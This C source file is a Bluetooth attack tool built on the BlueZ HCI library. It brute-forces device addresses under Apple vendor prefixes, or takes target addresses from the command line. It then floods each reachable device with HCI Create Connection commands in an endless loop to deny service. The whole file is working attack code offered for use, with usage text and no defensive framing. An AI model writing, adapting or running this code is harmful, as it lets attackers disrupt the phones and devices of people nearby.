#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <pthread.h>

#include "enum_addr.h"

void *dos_mac(void *arg);
int enum_addr(int sock);
int can_con(int sock, void *addr);

int main(int argc, char **argv)
{
	unsigned char buff[24]={0};
	int opt, dev_id, sock, n_devs, i, err;
	int bad_addr = 0;
	bdaddr_t tmp_bdaddr;

	if (argc < 2){
		printf("Usage:\n");
		printf("enum_addr -a \n");
		printf("enum_addr -b <target bd_addr1> <target bd_adder2>  \n");
		return -1;
	}

	dev_id = hci_get_route(NULL);
	sock = hci_open_dev( dev_id );
	if (dev_id < 0 || sock < 0) {
		perror("opening socket");
		exit(1);
	}
	printf("Got sock: %d\n",sock);
	((int*)buff)[0] = sock;
	if ((opt = getopt(argc, argv, "ab:")) != -1){
		switch(opt){
			case 'a':
				enum_addr(sock);
				close(sock);
				return 0;

			case 'b':
				//printf(" Num of Addrs: %d\n", argc - 2);
				for (n_devs = 2; n_devs < argc; n_devs++){
					if (str2ba(argv[n_devs],&tmp_bdaddr))
						bad_addr = 1;
				}

				if(bad_addr){
					printf("Bad address\n");
					close(sock);
					return -1;
				}

				for (n_devs = 2; n_devs < argc; n_devs++){
					//printf("%s\n", argv[n_devs]);
					str2ba(argv[n_devs], &tmp_bdaddr);
					memcpy(buff+sizeof(int), tmp_bdaddr.b, 6);
					if( can_con(sock, tmp_bdaddr.b))
						dos_mac((void*)buff);
					/*
					if( 1 || can_con(sock, tmp_bdaddr.b)){
						pthread_t tid;
						printf("UP: %s\n",argv[n_devs]);
						if(pthread_create(&tid, NULL, dos_mac, (void*)(buff)) == -1){
							perror("[!!] Fatal, Creating Thread");
							close(sock);
							exit(-1);
						}
						pthread_join(tid, NULL);
					}*/

				}

				return 0;
			default:
				printf("Usage:\n");
				printf("enum_addr -a \n");
				printf("enum_addr -b <target bd_addr1> <target bd_adder2>  \n");
				close(sock);
				return -1;
		}
	}

	close( sock );
	printf("Main thread exit\n");
	return 0;
}

void *dos_mac(void *arg)
{
	int *sock_ptr = (int*)arg;
	unsigned char addr[6]; 
	char str[24]={0};
	int err = 0;
	
	memcpy(addr, arg+sizeof(int),6);
	ba2str((void*)addr,str);
	printf("DOS'ng Initiated on: %s on socket: %d\n", str, *sock_ptr);

	while(1){
		hci_send_cmd(*sock_ptr, 0x01, 0x05, 6,(void*) addr);
		usleep(150000);
	}
	hci_close_dev(*sock_ptr);
	return NULL;
}

int can_con(int sock, void *addr)
{
	unsigned char buff[255] = {0};
	struct hci_request req = {.ogf=0x01, .ocf=0x05, .event=0x03, .cparam=addr, .clen=6, .rparam=(void*)buff, .rlen=255 };

	int res,i; 
	//res = hci_send_cmd(sock, 0x01, 0x05, 6,(void*) addr);
	//hci_send_cmd(sock, 0x01, 0x06, 6,(void*) addr);
	res = hci_send_req(sock , &req ,10 );
	return ( !res && !buff[0] );
}

int enum_addr(int sock)
{
	int x,y,z,i,j;
	unsigned char param[6] = {0};
	unsigned char buff[24] = {0};
	for(i = 0; i < sizeof(apple_macs)/3;i++){
		memcpy(param+3,apple_macs[i],3);
		
		for(x = 0; x < 256 ;x++)
			for(y = 0; y < 256 ;y++)
				for(z = 0; z < 256 ;z++){
					param[0]=x;
					param[1]=y;
					param[2]=z;
					((int*)buff)[0] = sock;
					memcpy(buff+4, param, 6);
					if(can_con(sock, (void*)param)){
						dos_mac((void*)buff);
						/*pthread_t tid;
						((int*)buff)[0] = sock;
						printf("BD_ADDR MAC: ");
						for(j=6; j > 0; j--)
							printf("%X:", param[j]);

						printf("%X\n", param[j]);
						memcpy(buff+4, param, 6);
						if(pthread_create(&tid, NULL, dos_mac,(void*)buff) == -1){
							perror("[!!] Fatal, Creating Thread");
							close(sock);
							//close(newsock);
							exit(-1);
						}
						pthread_join(tid,NULL);
						*/
					}

				}
	}

	return 0;
}

